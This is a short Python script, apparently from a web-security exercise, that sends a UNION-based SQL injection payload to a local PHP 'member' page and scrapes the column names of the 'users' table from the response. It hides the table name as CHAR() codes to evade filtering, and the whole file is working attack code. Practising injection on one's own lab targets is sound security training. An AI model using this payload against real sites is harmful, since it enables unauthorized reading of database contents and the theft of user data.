from requests import get
import re

def main():
    # users COLUMNS
    id = "0 UNION SELECT column_name, null FROM information_schema.columns \
    WHERE table_name = CHAR(117,115,101,114,115)" # users
    url = f"http://localhost:8080/index.php?page=member&id={id}&Submit=Submit#"
    response = get(url)
    usersTableColumns = re.findall(r"First name:\s*([^\n<]+)", response.text)

    for name in usersTableColumns:
        print(name)

if __name__ == "__main__":
	main()